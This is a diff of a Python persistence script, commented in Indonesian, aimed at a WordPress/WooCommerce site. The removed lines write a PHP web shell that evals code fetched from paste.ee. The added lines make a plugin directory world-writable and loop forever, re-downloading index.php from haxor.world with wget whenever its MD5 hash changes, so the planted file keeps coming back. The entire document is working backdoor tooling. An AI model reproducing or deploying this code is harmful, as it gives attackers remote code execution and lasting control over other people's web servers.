@@ -1,23 +1,48 @@
 import os
+import hashlib
 import time
-import os.path
+
+def calculate_md5(file_path):
+    # Baca isi file dan hitung MD5 hash
+    with open(file_path, 'rb') as f:
+        data = f.read()
+        md5_hash = hashlib.md5(data).hexdigest()
+    return md5_hash
 
 def main():
+    target_dir = '/home/feb/public_html/wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/filter-wrapper/'
+    target_file = os.path.join(target_dir, 'index.php')
+    expected_md5 = '196c32a609943a2432ebf17111c69b9a'
+    
     while True:
-        f = os.path.exists('/var/www/html/uploads/')
-        
-        if f == True:
-            print("[*] file exists")
-            pass
-            time.sleep(1)
-            
+        if os.path.exists(target_dir):
+            print("[*] Directory exists")
+            # Memeriksa apakah direktori dapat ditulis
+            if not os.access(target_dir, os.W_OK):
+                print("[!] Directory not writable. Changing permissions.")
+                os.chmod(target_dir, 777)
+                print("[*] Directory permissions changed to 777.")
         else:
-            print("[!] file not found")
-            print("[!] creating file")
-            # creating web shell 
-            a = open('/var/www/html/uploads/lph.php','a')
-            a.write('<?php eval("?>".file_get_contents("https://paste.ee/r/XB3kD"));?>') 
-            a.close()
+            print("[!] Directory not found")
+            print("[!] Creating directory")
+            os.makedirs(target_dir)
+            print("[*] Directory created")
 
-            time.sleep(1)
+        if os.path.exists(target_file):
+            print("[*] File exists")
+            # Hitung MD5 hash dari file yang ada
+            current_md5 = calculate_md5(target_file)
+            # Bandingkan dengan MD5 hash yang diharapkan
+            if current_md5 != expected_md5:
+                print("[!] MD5 hash mismatch. Downloading new content.")
+                os.system(f'wget -O {target_file} https://haxor.world/love.txt')
+            else:
+                print("[*] MD5 hash match. No need to download.")
+        else:
+            print("[!] File not found")
+            print("[!] Creating file")
+            os.system(f'wget -O {target_file} https://haxor.world/love.txt')
+
+        time.sleep(1)
+
 main()
